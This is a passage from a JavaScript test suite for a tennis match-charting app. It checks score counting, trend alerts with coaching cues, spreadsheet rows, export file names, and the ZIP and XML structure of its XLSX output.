        .reduce((n, s) => n + s[0] + s[1] - (Math.max(...s) === format.tiebreakAt + 1 && Math.min(...s) === format.tiebreakAt ? 1 : 0), 0);
      assert.equal(counted, expected, `${id} seed ${seed}: service games counted for ${ms.setsLabel()}`);
      assert.equal(st.players[0].pointsWon + st.players[1].pointsWon, points.length);
      assert.equal(st.momentum.length, points.length);
    }
  }
});

test('a game or tiebreak that is still going is not counted as finished', () => {
  const play = (format, winners) => {
    const ms = new T.MatchScore(format, 0, 0);
    const points = [];
    for (const w of winners) {
      points.push(pt(points.length + 1, { ...ms.snapshot(), winner: w, endedBy: w }));
      ms.pointWon(w);
    }
    return { points, ms };
  };
  const scoreLine = (pts) => T.matchWorkbook({ title: 'x', date: 'd', names: NAMES }, pts, [])[0].rows.find((r) => r[0] && String(r[0].v).startsWith('Final score'))[1];
  const last = (pts) => T.gameGroups(pts).pop();

  const live = play(FMT.college, [0, 0, 0]); // 40-0 on serve, not yet won
  assert.equal(last(live.points).complete, false);
  assert.equal(scoreLine(live.points), '0-0');
  assert.equal(T.computeStats(live.points).players[0].serviceGames.of, 0);
  const won = play(FMT.college, [0, 0, 0, 0]);
  assert.deepEqual([last(won.points).complete, last(won.points).winner], [true, 0]);
  assert.equal(scoreLine(won.points), '1-0');
  assert.deepEqual(T.computeStats(won.points).players[0].serviceGames, { won: 1, of: 1 });

  const toSixAll = [];
  for (let g = 0; g < 12; g++) for (let k = 0; k < 4; k++) toSixAll.push(g % 2);
  const mid = play(FMT.college, toSixAll.concat([0, 0, 0])); // 3-0 up in the tiebreak, the leader wins a point that does not end it
  assert.deepEqual([last(mid.points).tb, last(mid.points).complete], [true, false]);
  assert.equal(scoreLine(mid.points), '6-6');
  const sg = T.computeStats(mid.points).players;
  assert.equal(sg[0].serviceGames.of + sg[1].serviceGames.of, 12, 'the tiebreak is not a service game');
  const done = play(FMT.college, toSixAll.concat([0, 0, 0, 0, 0, 0, 0])); // 7-0
  assert.deepEqual([last(done.points).complete, last(done.points).winner], [true, 0]);
  assert.equal(scoreLine(done.points), '7-6');
  const comeback = play(FMT.college, toSixAll.concat([0, 0, 0, 0, 0, 0, 1])); // the leader's 7th point never came
  assert.equal(last(comeback.points).complete, false);
  assert.equal(scoreLine(comeback.points), '6-6');
});

// ======================================================================================
// trends
// ======================================================================================

const NAMES = ['Josiah', 'Opponent'];
const ids = (list) => list.map((a) => a.id);
const KINDS = ['serve', 'errors', 'form', 'pattern', 'mindset', 'scouting', 'fitness'];
const SEVERITIES = ['info', 'watch', 'fix'];

/** The alert `id` must fire for these points, exactly once more when `already` is not given. */
function expectAlert(points, id, extra) {
  const got = T.detectTrends(points, NAMES);
  const a = got.find((x) => x.id === id);
  assert.ok(a, `expected ${id}, got ${ids(got).join(', ') || 'nothing'}`);
  assert.equal(a.at, points[points.length - 1].n);
  assert.ok(KINDS.includes(a.kind) && SEVERITIES.includes(a.severity));
  assert.ok(a.title.length > 0 && a.title.length <= 48, a.title);
  assert.ok(a.detail.length > 0 && a.cue.length > 0);
  assert.equal(new Set(ids(got)).size, got.length, 'ids are unique');
  assert.deepEqual(T.detectTrends(points, NAMES, got), [], 'nothing new when everything is already raised');
  assert.deepEqual(ids(T.detectTrends(points, NAMES, got.filter((x) => x !== a))), [id], 'only the missing one comes back');
  if (extra) extra(a);
  return a;
}

test('trend: fs-low (first serve over the last 3 service games)', () => {
  const pts = [];
  let n = 0;
  for (let g = 1; g <= 10; g++) {
    const server = g % 2 ? 0 : 1;
    for (let k = 0; k < 4; k++) {
      n++;
      const miss = server === 0 && g >= 5 && k > 0; // 3 of the last 12 first serves in, 55% for the match
      pts.push(pt(n, { game: g, server, serve1In: !miss, serveNo: miss ? 2 : 1, winner: server, endedBy: server }));
    }
  }
  expectAlert(pts, 'fs-low:0:1', (a) => {
    assert.equal(a.kind, 'serve');
    assert.equal(a.severity, 'watch');
    assert.equal(a.who, 0);
    assert.equal(a.cue, 'Take 10% off the first serve and hit big targets. First ball in.');
  });
  assert.ok(!ids(T.detectTrends(pts, NAMES)).includes('fs-low:1:1'));
  // not enough serves in the window, or no drop against the match: nothing
  assert.ok(!ids(T.detectTrends(pts.slice(0, 24), NAMES)).some((i) => i.startsWith('fs-low')));
});

test('trend: df-cluster (2+ double faults in the last 2 service games)', () => {
  const pts = [];
  let n = 0;
  for (let g = 1; g <= 4; g++) {
    const server = g % 2 ? 0 : 1;
    for (let k = 0; k < 4; k++) {
      n++;
      const df = server === 0 && ((g === 1 && k === 1) || (g === 3 && k === 2));
      pts.push(pt(n, { game: g, server, serve1In: !df, serveNo: df ? 2 : 1, outcome: df ? 'df' : 'winner', winner: df ? 1 : server, endedBy: df ? 0 : server, rally: df ? 0 : 4 }));
    }
  }
  expectAlert(pts, 'df-cluster:0:11', (a) => {
    assert.equal(a.kind, 'serve');
    assert.equal(a.severity, 'fix');
  });
  // the same two double faults inside one in-progress game also count
  assert.ok(ids(T.detectTrends(pts.slice(0, 11), NAMES)).includes('df-cluster:0:11'));
});

test('trend: ue-wing (3+ unforced errors on one wing in the last 10 points)', () => {
  const pts = [];
  for (let n = 1; n <= 14; n++) {
    const ue = n === 8 || n === 11 || n === 13;
    const o = { game: 1, server: 1, winner: 1, endedBy: 1, outcome: 'winner', wing: 'BH' };
    if (ue) Object.assign(o, { outcome: 'ue', endedBy: 0, wing: 'FH', rally: n === 13 ? 7 : 4 });
    if (n === 8) o.shots = [{ i: 0, who: 1, kind: 'serve' }, { i: 1, who: 0, kind: 'return' }, { i: 2, who: 1, kind: 'ground' }];
    if (n === 11) o.shots = [0, 1, 2, 3, 4].map((i) => ({ i, who: i % 2, kind: 'ground' }));
    pts.push(pt(n, o));
  }
  expectAlert(pts, 'ue-wing:0:FH:1', (a) => {
    assert.equal(a.kind, 'errors');
    assert.equal(a.severity, 'fix');
    assert.equal(a.cue, 'More margin on the forehand: clear the net by a metre, aim a metre inside the lines.');
    assert.deepEqual(a.shotRefs, [{ n: 8, i: 2 }, { n: 11, i: 4 }, { n: 13, i: 6 }]);
  });
  assert.ok(!ids(T.detectTrends(pts, NAMES)).some((i) => i.startsWith('ue-wing:0:BH')));
  assert.ok(!ids(T.detectTrends(pts, NAMES)).some((i) => i.startsWith('ue-wing:1')));
  // the bucket moves with the point number, so a later bucket can raise it again
  const more = pts.concat([15, 16, 17].map((n) => pt(n, { outcome: 'ue', endedBy: 0, wing: 'FH', winner: 1, server: 1 })));
  assert.ok(ids(T.detectTrends(more, NAMES)).includes('ue-wing:0:FH:1'));
  assert.ok(ids(T.detectTrends(more.concat(pt(20, { outcome: 'ue', endedBy: 0, wing: 'FH', winner: 1, server: 1 })), NAMES)).includes('ue-wing:0:FH:2'));
});

test('trend: reset (lost 3 of the last 4 points after an own unforced error)', () => {
  const spec = [
    ['ue', 0, 'FH'], ['winner', 1, null], ['ue', 0, 'BH'], ['winner', 1, null],
    ['ue', 0, 'FH'], ['winner', 0, 'FH'], ['ue', 0, 'BH'], ['winner', 1, null],
  ];
  const pts = spec.map(([outcome, w, wing], i) => pt(i + 1, { server: 1, outcome, winner: outcome === 'ue' ? 1 : w, endedBy: outcome === 'ue' ? 0 : w, wing }));
  expectAlert(pts, 'reset:0:8', (a) => {
    assert.equal(a.kind, 'mindset');
    assert.equal(a.cue, 'Use the between-point reset: turn away, breathe, pick a target for the next ball.');
  });
  assert.ok(!ids(T.detectTrends(pts.slice(0, 6), NAMES)).includes('reset:0:6'));
});

test('trend: pressure (under 35% of 6+ pressure points won)', () => {
  const pts = [];
  for (let n = 1; n <= 8; n++) pts.push(pt(n, { server: 1, pressure: n <= 6, winner: n <= 2 || n === 7 ? 0 : 1, endedBy: n <= 2 || n === 7 ? 0 : 1 }));
  expectAlert(pts, 'pressure:0:1', (a) => {
    assert.equal(a.kind, 'mindset');
    assert.equal(a.severity, 'watch');
  });
  assert.ok(!ids(T.detectTrends(pts, NAMES)).includes('pressure:1:1'));
  const few = pts.map((p) => ({ ...p, pressure: p.n <= 5 }));
  assert.ok(!ids(T.detectTrends(few, NAMES)).some((i) => i.startsWith('pressure')), 'only 5 pressure points');
});

test('trend: opp-serve (the opponent leans on one placement)', () => {
  const places = [['deuce', 'T'], ['ad', 'Wide'], ['deuce', 'T'], ['ad', 'Wide'], ['deuce', 'T'], ['ad', 'Wide'], ['deuce', 'Body'], ['ad', 'Wide'], ['deuce', 'Wide'], ['ad', 'T']];
  const pts = places.map(([side, placement], i) => pt(i + 1, { server: 1, side, placement, winner: i % 2 ? 1 : 0, endedBy: i % 2 ? 1 : 0 }));
  const got = T.detectTrends(pts, NAMES);
  const a = got.find((x) => x.id === 'opp-serve:deuce:T');
  assert.ok(a, ids(got).join());
  assert.equal(a.who, 1);
  assert.equal(a.kind, 'scouting');
  assert.equal(a.severity, 'info');
  assert.equal(a.cue, 'Shade toward the T on the deuce side.');
  assert.ok(ids(got).includes('opp-serve:ad:Wide'));
  assert.deepEqual(T.detectTrends(pts, NAMES, got).filter((x) => x.kind === 'scouting'), []);
  assert.ok(!ids(T.detectTrends(pts.slice(0, 6), NAMES)).some((i) => i.startsWith('opp-serve')), 'fewer than 5 serves on a side');
});

test('trend: long-rally (the opponent wins 70%+ of 9+ shot rallies)', () => {
  const pts = [1, 2, 3, 4, 5].map((n) => pt(n, { server: 0, rally: 10, winner: n === 1 ? 0 : 1, endedBy: n === 1 ? 0 : 1 }));
  expectAlert(pts, 'long-rally:0', (a) => {
    assert.equal(a.kind, 'pattern');
    assert.equal(a.cue, 'Shorten points: take the first short ball and attack.');
  });
  assert.ok(!ids(T.detectTrends(pts, NAMES)).includes('long-rally:1'));
  assert.ok(!ids(T.detectTrends(pts.slice(0, 4), NAMES)).some((i) => i.startsWith('long-rally')), 'only 4 long rallies');
});

test('trend: short-ball (9 of the last 12 rally balls short of the deep zone, 3+ inside the service line)', () => {
  const depths = ['mid', 'short', 'mid', 'short', 'deep', 'mid', 'short', 'mid', 'mid', 'deep', 'mid', 'deep'];
  const pts = depths.map((depth, i) => pt(i + 1, { server: 1, shots: [{ i: 1, who: 0, kind: 'ground', depth }] }));
  expectAlert(pts, 'short-ball:0:1', (a) => {
    assert.equal(a.kind, 'pattern');
    assert.equal(a.cue, 'Get depth: more net clearance, aim two metres inside the baseline.');
    assert.deepEqual(a.shotRefs.map((r) => r.n), [1, 2, 3, 4, 6, 7, 8, 9, 11]);
  });
  // lots of mid-court balls but almost none inside the service line: ordinary college rallying
  const mid = depths.map((d, i) => pt(i + 1, { server: 1, shots: [{ i: 1, who: 0, kind: 'ground', depth: d === 'short' && i > 2 ? 'mid' : d }] }));
  assert.ok(!ids(T.detectTrends(mid, NAMES)).some((i) => i.startsWith('short-ball:0')), 'needs 3 balls inside the service line');
  assert.ok(!ids(T.detectTrends(pts.slice(0, 11), NAMES)).some((i) => i.startsWith('short-ball:0')), 'needs 12 tracked balls');
});

test('trend: knee (trophy-position knee angle 10 degrees straighter)', () => {
  const knees = [100, 100, 100, 100, 100, 110, 110, 115, 115, 115, 115, 115];
  const pts = knees.map((k, i) => pt(i + 1, { shots: [{ i: 0, who: 0, kind: 'serve', form: { trophyKnee: k } }] }));
  expectAlert(pts, 'knee:0:1', (a) => {
    assert.equal(a.kind, 'form');
    assert.equal(a.cue, 'Load the legs in the trophy position: bend the knees.');
    assert.deepEqual(a.shotRefs, [8, 9, 10, 11, 12].map((n) => ({ n, i: 0 })));
  });
  const steady = knees.map((k, i) => pt(i + 1, { shots: [{ i: 0, who: 0, kind: 'serve', form: { trophyKnee: k > 100 && i > 6 ? 105 : 100 } }] }));
  assert.ok(!ids(T.detectTrends(steady, NAMES)).some((i) => i.startsWith('knee')));
  assert.ok(!ids(T.detectTrends(pts.slice(0, 9), NAMES)).some((i) => i.startsWith('knee')), 'needs 10 serves');
});

test('trend: split (no split step on half of the last 8 shots)', () => {
  const steps = [false, false, true, false, true, true, false, true];
  const pts = steps.map((s, i) => pt(i + 1, { server: 1, shots: [{ i: 1, who: 0, kind: 'ground', form: { splitStep: s } }] }));
  expectAlert(pts, 'split:0:0', (a) => {
    assert.equal(a.kind, 'form');
    assert.equal(a.cue, 'Split-step as the opponent swings.');
    assert.deepEqual(a.shotRefs.map((r) => r.n), [1, 2, 4, 7]);
  });
  const good = steps.map((s, i) => pt(i + 1, { server: 1, shots: [{ i: 1, who: 0, kind: 'ground', form: { splitStep: i === 3 ? false : true } }] }));
  assert.ok(!ids(T.detectTrends(good, NAMES)).some((i) => i.startsWith('split:0')));
});

test('trend: run (the opponent wins 5+ points in a row) keeps one id while the run goes on', () => {
  const winners = [0, 0, 0, 1, 1, 1, 1, 1];
  const pts = winners.map((w, i) => pt(i + 1, { server: 1, winner: w, endedBy: w }));
  const a = expectAlert(pts, 'run:0:4', (x) => {
    assert.equal(x.kind, 'mindset');
    assert.equal(x.cue, 'Slow down, take the full 25 seconds, play high-percentage targets.');
  });
  const longer = pts.concat(pt(9, { server: 1, winner: 1, endedBy: 1 }), pt(10, { server: 1, winner: 1, endedBy: 1 }));
  assert.deepEqual(T.detectTrends(longer, NAMES, [a]).filter((x) => x.id.startsWith('run')), [], 'same run, same id');
  assert.ok(!ids(T.detectTrends(pts.slice(0, 7), NAMES)).some((i) => i.startsWith('run:0')), 'only 4 in a row');
  assert.ok(!ids(T.detectTrends(pts.concat(pt(9, { winner: 0 })), NAMES)).some((i) => i.startsWith('run:0')), 'the run ended');
});

test('trend: pace (first-serve speed 8% down over the last 8 serves)', () => {
  const pts = [];
  for (let n = 1; n <= 16; n++) pts.push(pt(n, { serve1Speed: n <= 8 ? 100 : 91 }));
  expectAlert(pts, 'pace:0:1', (a) => {
    assert.equal(a.kind, 'fitness');
    assert.equal(a.cue, 'Serve speed is dropping: legs and hydration at the changeover.');
  });
  const ok = pts.map((p) => ({ ...p, serve1Speed: p.n <= 8 ? 100 : 93 }));
  assert.ok(!ids(T.detectTrends(ok, NAMES)).some((i) => i.startsWith('pace')), '7% is not enough');
});

test('trends: quiet match, long names, and a running match raises each id once', () => {
  const quiet = [];
  for (let n = 1; n <= 20; n++) quiet.push(pt(n, { game: Math.ceil(n / 4), server: Math.ceil(n / 4) % 2 ? 0 : 1, winner: n % 2, endedBy: n % 2 }));
  assert.deepEqual(T.detectTrends(quiet, NAMES), []);
  assert.deepEqual(T.detectTrends([], NAMES), []);

  const long = ['Bartholomew Montgomery-Featherstonehaugh', 'Zacharias Wolfeschlegelsteinhausenbergerdorff'];
  const { points } = simulate(FMT.standard, 77, true);
  let seen = [];
  const all = [];
  for (let k = 1; k <= points.length; k++) {
    const fresh = T.detectTrends(points.slice(0, k), long, seen);
    for (const a of fresh) {
      assert.ok(a.title.length <= 48, a.title);
      assert.ok(a.at <= k);
      assert.ok(!all.includes(a.id), `${a.id} raised twice`);
      all.push(a.id);
    }
    seen = seen.concat(fresh);
  }
  assert.ok(all.length > 0, 'a long simulated match should trip something');
});

// ======================================================================================
// sheet layout
// ======================================================================================

test('pointLogRows: header, friendly values and outcome colours', () => {
  const points = [
    pt(1, { serve1Speed: 101.26, placement: 'T', outcome: 'ace', rally: 1, finalKind: 'serve', durSec: 6.34, src: 'auto' }),
    pt(2, { scoreBefore: '15-0', side: 'ad', serve1In: false, serveNo: 2, serve1Speed: 90, serve2Speed: 78.5, placement: 'Body', outcome: 'df', winner: 1, endedBy: 0, rally: 0, pressure: true, breakPoint: true, note: 'foot fault' }),
    pt(3, { outcome: 'ue', winner: 1, endedBy: 0, wing: 'BH', finalKind: 'ground', netApproach: 1, src: 'confirmed' }),
    pt(4, { outcome: 'fe', winner: 0, endedBy: 1 }),
    pt(5, { outcome: 'serviceWinner' }),
    pt(6, { outcome: 'winner', wing: 'FH', finalKind: 'volley' }),
    pt(7, { tb: true, scoreBefore: '5-4', game: 13 }),
  ];
  const rows = T.pointLogRows(points, NAMES);
  assert.deepEqual(rows[0], ['#', 'Set', 'Game', 'Score', 'Server', 'Side', '1st In', 'Serve #', 'Serve mph', 'Placement', 'Rally', 'Outcome', 'Won by', 'Ended by', 'Wing', 'Final shot', 'Pressure', 'Break pt', 'Net', 'Secs', 'Source', 'Note']);
  assert.equal(rows.length, 8);
  assert.equal(rows[7][3], 'TB 5-4', 'tiebreak scores are not left to look like dates');
  assert.equal(rows[1][3], '0-0');
  assert.deepEqual(rows[1], [1, 1, 1, '0-0', 'Josiah', 'Deuce', 'Yes', 1, 101.3, 'T', 1, { v: 'Ace', s: 'good' }, 'Josiah', 'Josiah', '', 'Serve', '', '', '', 6.3, 'Auto', '']);
  assert.deepEqual(rows[2], [2, 1, 1, '15-0', 'Josiah', 'Ad', '', 2, 78.5, 'Body', 0, { v: 'Double fault', s: 'bad' }, 'Opponent', 'Josiah', '', '', 'Yes', 'Yes', '', '', 'Manual', 'foot fault']);
  assert.deepEqual(rows[3].slice(11, 20), [{ v: 'Unforced error', s: 'bad' }, 'Opponent', 'Josiah', 'Backhand', 'Groundstroke', '', '', 'Opponent', '']);
  assert.deepEqual(rows[3][20], 'Confirmed');
  assert.deepEqual(rows[4][11], { v: 'Forced error' });
  assert.deepEqual(rows[5][11], { v: 'Service winner', s: 'good' });
  assert.deepEqual(rows[6][11], { v: 'Winner', s: 'good' });
  assert.equal(rows[6][15], 'Volley');
  assert.ok(rows.every((r) => r.length === 22));
});

test('shotRows: header and one row per tracked shot', () => {
  const rows = T.shotRows(FIX, NAMES);
  assert.deepEqual(rows[0], ['Point', 'Shot', 'Player', 'Type', 'Wing', 'Speed mph', 'Spin rpm', 'Swing mph', 'Depth', 'Direction', 'Bounce x m', 'Bounce y m', 'Net clear m', 'Knee min°', 'Stance', 'Hip-shoulder°', 'Split step']);
  assert.equal(rows.length, 1 + 1 + 4 + 1);
  assert.deepEqual(rows[1], [1, 1, 'Josiah', 'Serve', '', 100, '', '', '', '', '', '', '', '', '', '', '']);
  assert.deepEqual(rows[3], [2, 2, 'Opponent', 'Return', 'Backhand', 60, 1000, 50, 'Deep', '', '', '', '', 140, '', '', 'Yes']);
  assert.equal(rows[4][16], 'No');
  const rich = T.shotRows([pt(1, { shots: [{ i: 2, who: 1, kind: 'drop', wing: 'FH', speed: 41.234, spin: -800.4, swing: 33.33, depth: 'short', dir: 'DTL', bounce: { x: -1.2345, y: 9.8765 }, netClear: 0.1234, form: { kneeMin: 129.6, stance: 1.234, sep: 21.4, splitStep: false } }] })], NAMES);
  assert.deepEqual(rich[1], [1, 3, 'Opponent', 'Drop shot', 'Forehand', 41.2, -800, 33.3, 'Short', 'Down the line', -1.23, 9.88, 0.12, 130, 1.23, 21, 'No']);
  assert.equal(T.shotRows([pt(1)], NAMES).length, 1);
});

test('summaryRows: header, the seven sections and their rows', () => {
  const rows = T.summaryRows(T.computeStats(FIX), NAMES);
  assert.deepEqual(rows[0], [{ v: 'Stat', s: 'h' }, { v: 'Josiah', s: 'h' }, { v: 'Opponent', s: 'h' }]);
  assert.ok(rows.every((r) => r.length === 3));
  const sections = rows.filter((r) => r[0].s === 'hl').map((r) => r[0].v);
  assert.deepEqual(sections, ['Serve', 'Return', 'Rally', 'Winners & errors', 'Pressure & mindset', 'Ball & swing (estimated)', 'Form (estimated)']);
  assert.ok(rows.filter((r) => r[0].s === 'hl').every((r) => r[1].s === 'hl' && r[2].s === 'hl' && r[1].v === '' && r[2].v === ''));
  const find = (label) => rows.find((r) => r[0] === label);
  assert.deepEqual(find('1st serve in'), ['1st serve in', '5/7 (71%)', '5/6 (83%)']);
  assert.deepEqual(find('Service games held'), ['Service games held', '0/1 (0%)', '0/1 (0%)']);
  assert.deepEqual(find('Aces'), ['Aces', { v: 2, s: 'int' }, { v: 0, s: 'int' }]);
  assert.deepEqual(find('1st serve speed, avg mph'), ['1st serve speed, avg mph', { v: 95.7, s: 'num1' }, { v: 99.2, s: 'num1' }]);
  assert.deepEqual(find('Average rally, shots'), ['Average rally, shots', { v: 4.4, s: 'num1' }, { v: 4.4, s: 'num1' }]);
  assert.deepEqual(find('Deep balls'), ['Deep balls', '1/2 (50%)', '1/2 (50%)']);
  const empty = T.summaryRows(T.computeStats([]), NAMES);
  assert.deepEqual(empty.find((r) => r[0] === '1st serve in'), ['1st serve in', '-', '-']);
  assert.deepEqual(empty.find((r) => r[0] === 'Spin, avg rpm'), ['Spin, avg rpm', '', '']);
});

test('matchWorkbook: five sheets, a score line that matches the scoreboard, and files names', () => {
  for (const [id, format] of Object.entries(FMT)) {
    for (let seed = 1; seed <= 25; seed++) {
      const { points, ms } = simulate(format, seed * 37, false);
      const wb = T.matchWorkbook({ title: 'x', date: '2026-10-02', names: NAMES }, points, []);
      const summary = wb[0];
      const line = summary.rows.find((r) => typeof r[0] === 'object' && String(r[0].v).startsWith('Final score'));
      assert.equal(line[1], ms.setsLabel(), `${id} seed ${seed}`);
    }
  }

  const meta = { title: 'Geneva at Westminster', date: '2026-10-02', names: NAMES, formatLabel: 'College dual', location: 'Westminster, PA', chartedBy: 'Coach' };
  const { points } = simulate(FMT.college, 5, true);
  const alerts = T.detectTrends(points, NAMES);
  const wb = T.matchWorkbook(meta, points, alerts);
  assert.deepEqual(wb.map((s) => s.name), ['Summary', 'Points', 'Shots', 'Serve Map', 'Trends']);
  const sum = wb[0];
  assert.deepEqual(sum.merges, ['A1:C1', 'A2:C2']);
  assert.deepEqual(sum.rows[0], [{ v: 'Geneva at Westminster', s: 'title' }]);
  const header = sum.rows.findIndex((r) => r[0] && r[0].v === 'Stat');
  assert.equal(sum.freeze.rows, header + 1, 'frozen through the table header');
  const labels = sum.rows.slice(2, header).map((r) => (r[0] && r[0].v) || '');
  assert.deepEqual(labels.slice(0, 5), ['Date', 'Location', 'Format', 'Charted by', labels[4]]);
  assert.ok(labels[4].startsWith('Final score (Josiah first)'));
  assert.deepEqual(sum.rows[2], [{ v: 'Date', s: 'bold' }, '2026-10-02']);
  assert.deepEqual(wb[1].freeze, { rows: 1, cols: 1 });
  assert.equal(wb[1].autoFilter, 'A1:V1');
  assert.equal(wb[1].rows.length, points.length + 1);
  assert.equal(wb[1].rows[0].length, 22);
  assert.deepEqual(wb[1].rows[0], T.pointLogRows([], NAMES)[0].map((v) => ({ v, s: 'h' })), 'the table headers are styled');
  assert.deepEqual(wb[2].rows[0], T.shotRows([], NAMES)[0].map((v) => ({ v, s: 'h' })));
  assert.equal(wb[2].rows[0].length, 17);
  assert.ok(wb.every((s) => s.rows.length > 0));

  const map = wb[3];
  assert.deepEqual(map.rows[3].map((c) => c.v), ['Player', 'Side', 'Wide', 'Body', 'T', 'Total', 'Wide %', 'Body %', 'T %']);
  const stats = T.computeStats(points);
  const deuce0 = map.rows[4];
  assert.deepEqual(deuce0.slice(0, 6), ['Josiah', 'Deuce', stats.players[0].placement.deuce.Wide, stats.players[0].placement.deuce.Body, stats.players[0].placement.deuce.T, deuce0[2] + deuce0[3] + deuce0[4]]);
  assert.equal(map.rows.length, 4 + 6);
  assert.deepEqual(wb[4].rows[0].map((c) => c.v), ['Point #', 'Player', 'Kind', 'Severity', 'Title', 'Detail', 'Cue']);
  assert.equal(wb[4].rows.length, 1 + Math.max(1, alerts.length));
  assert.equal(T.matchWorkbook(meta, [], undefined)[4].rows.length, 2, 'no alerts: header and a note');
  assert.equal(T.matchWorkbook(meta, [], []).length, 5, 'an empty match still builds');
});

test('matchFileName strips what a file name cannot hold', () => {
  assert.equal(T.matchFileName({ title: 'x', date: '2026-10-02', names: ['Josiah Shaver', 'Mount Union / Purple Raiders: #1'] }, 'xlsx'), 'GenevaTennis_2026-10-02_Josiah-Shaver-vs-Mount-Union-Purple-Raiders-1.xlsx');
  assert.equal(T.matchFileName({ title: 'x', date: '2026-10-02', names: ['A*B?', '<C>|"D"'] }, 'csv'), 'GenevaTennis_2026-10-02_AB-vs-CD.csv');
  assert.equal(T.matchFileName({ title: 'x', date: '2026-10-02', names: ['', ''] }, 'csv'), 'GenevaTennis_2026-10-02_Ours-vs-Theirs.csv');
  assert.match(T.matchFileName({ title: 'x', date: '', names: ['a', 'b'] }, 'xlsx'), /^GenevaTennis_\d{4}-\d{2}-\d{2}_a-vs-b\.xlsx$/);
});

// ======================================================================================
// xlsx, csv, base64
// ======================================================================================

/** Walks the central directory and checks every entry: STORE, sizes, CRC-32, no gaps. */
function readZip(buf) {
  const eocd = buf.lastIndexOf(Buffer.from([0x50, 0x4b, 0x05, 0x06]));
  assert.ok(eocd >= 0, 'end of central directory');
  assert.equal(buf.length, eocd + 22, 'no trailing bytes');
  const count = buf.readUInt16LE(eocd + 10);
  assert.equal(buf.readUInt16LE(eocd + 8), count);
  const cdSize = buf.readUInt32LE(eocd + 12);
  const cdOff = buf.readUInt32LE(eocd + 16);
  assert.equal(cdOff + cdSize, eocd);
  const out = new Map();
  let p = cdOff;
  let localOff = 0;
  for (let i = 0; i < count; i++) {
    assert.equal(buf.readUInt32LE(p), 0x02014b50);
    const method = buf.readUInt16LE(p + 10);
    const crc = buf.readUInt32LE(p + 16);
    const csize = buf.readUInt32LE(p + 20);
    const usize = buf.readUInt32LE(p + 24);
    const nlen = buf.readUInt16LE(p + 28);
    const elen = buf.readUInt16LE(p + 30);
    const clen = buf.readUInt16LE(p + 32);
    const lho = buf.readUInt32LE(p + 42);
    const name = buf.toString('utf8', p + 46, p + 46 + nlen);
    assert.equal(method, 0, `${name} is STORED`);
    assert.equal(csize, usize);
    assert.equal(lho, localOff, `${name} starts where the previous entry ended`);
    assert.equal(buf.readUInt32LE(lho), 0x04034b50);
    assert.equal(buf.readUInt16LE(lho + 4), buf.readUInt16LE(p + 6), `${name}: version needed`);
    assert.equal(buf.readUInt16LE(lho + 6), buf.readUInt16LE(p + 8), `${name}: flags`);
    assert.equal(buf.readUInt16LE(lho + 8), method, `${name}: local and central method agree`);
    assert.equal(buf.readUInt16LE(lho + 10), buf.readUInt16LE(p + 12), `${name}: time`);
    assert.equal(buf.readUInt16LE(lho + 12), buf.readUInt16LE(p + 14), `${name}: date`);
    assert.equal(buf.readUInt32LE(lho + 14), crc);
    assert.equal(buf.readUInt32LE(lho + 18), csize);
    assert.equal(buf.readUInt32LE(lho + 22), usize);
    assert.equal(buf.toString('utf8', lho + 30, lho + 30 + buf.readUInt16LE(lho + 26)), name);
    const start = lho + 30 + buf.readUInt16LE(lho + 26) + buf.readUInt16LE(lho + 28);
    const data = buf.subarray(start, start + usize);
    assert.equal(crc32(data), crc, `CRC-32 of ${name}`);
    localOff = start + usize;
    out.set(name, data);
    p += 46 + nlen + elen + clen;
  }
  assert.equal(p, cdOff + cdSize);
  assert.equal(localOff, cdOff, 'the last entry ends where the central directory starts');
  return out;
}

/** Tags balance, attributes are quoted, no bare & or <, no characters XML 1.0 forbids. */
function assertWellFormed(name, text) {
  assert.ok(text.startsWith('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'), `${name}: declaration`);
  assert.ok(!/[\u0000-\u0008\u000b\u000c\u000e-\u001f\ufffe\uffff]/.test(text), `${name}: forbidden character`);
  assert.ok(!/[\ud800-\udbff](?![\udc00-\udfff])|(?:[^\ud800-\udbff]|^)[\udc00-\udfff]/.test(text), `${name}: lone surrogate`);
  const body = text.slice(text.indexOf('?>') + 2);
  const bare = /&(?!(amp|lt|gt|quot|apos|#\d+|#x[0-9a-fA-F]+);)/;
  const tag = /<(\/?)([A-Za-z_][\w:.-]*)((?:\s+[\w:.-]+="[^"<]*")*)\s*(\/?)>/g;
  const stack = [];
  let last = 0;
  let roots = 0;
  let m;
  while ((m = tag.exec(body))) {
    const between = body.slice(last, m.index);
    assert.ok(!between.includes('<') && !bare.test(between), `${name}: text before offset ${m.index}`);
    assert.ok(!bare.test(m[3]), `${name}: attribute of <${m[2]}>`);
    if (m[1]) assert.equal(stack.pop(), m[2], `${name}: </${m[2]}> closes the wrong tag`);
    else if (!m[4]) {
      if (!stack.length) roots++;
      stack.push(m[2]);
    } else if (!stack.length) roots++;
    last = tag.lastIndex;
  }
  assert.ok(!body.slice(last).includes('<') && !bare.test(body.slice(last)), `${name}: trailing text`);
  assert.equal(stack.length, 0, `${name}: unclosed ${stack.join()}`);
  assert.equal(roots, 1, `${name}: one root element`);
}

test('buildXlsx: a valid ZIP of well-formed OOXML parts', () => {
  const { points } = simulate(FMT.college, 11, true);
  const meta = { title: 'Geneva & Friends <test> "quoted"', date: '2026-10-02', names: ['José "J" O\'Brien', 'Zoë & Co <3'], formatLabel: 'College dual', chartedBy: 'Coach' };
  const alerts = T.detectTrends(points, meta.names);
  const bytes = T.buildXlsx(T.matchWorkbook(meta, points, alerts));
  assert.ok(bytes instanceof Uint8Array);
  const dir = mkdtempSync(join(tmpdir(), 'tennis-xlsx-'));
  const file = join(dir, T.matchFileName(meta, 'xlsx'));
  writeFileSync(file, bytes);
  const zip = readZip(readFileSync(file));
  rmSync(dir, { recursive: true, force: true });
  const names = [...zip.keys()];
  assert.equal(names[0], '[Content_Types].xml');
  assert.deepEqual(names.slice().sort(), [
    '[Content_Types].xml', '_rels/.rels', 'docProps/app.xml', 'docProps/core.xml', 'xl/_rels/workbook.xml.rels', 'xl/styles.xml', 'xl/workbook.xml',
    'xl/worksheets/sheet1.xml', 'xl/worksheets/sheet2.xml', 'xl/worksheets/sheet3.xml', 'xl/worksheets/sheet4.xml', 'xl/worksheets/sheet5.xml',
  ]);
  const text = (n) => zip.get(n).toString('utf8');
  for (const n of names) assertWellFormed(n, text(n));

  const wbXml = text('xl/workbook.xml');
  assert.match(wbXml, /<sheet name="Summary" sheetId="1" r:id="rId1"\/>/);
  assert.match(wbXml, /<sheet name="Trends" sheetId="5" r:id="rId5"\/>/);
  assert.match(wbXml, /<definedName name="_xlnm\._FilterDatabase" localSheetId="1" hidden="1">'Points'!\$A\$1:\$V\$\d+<\/definedName>/);
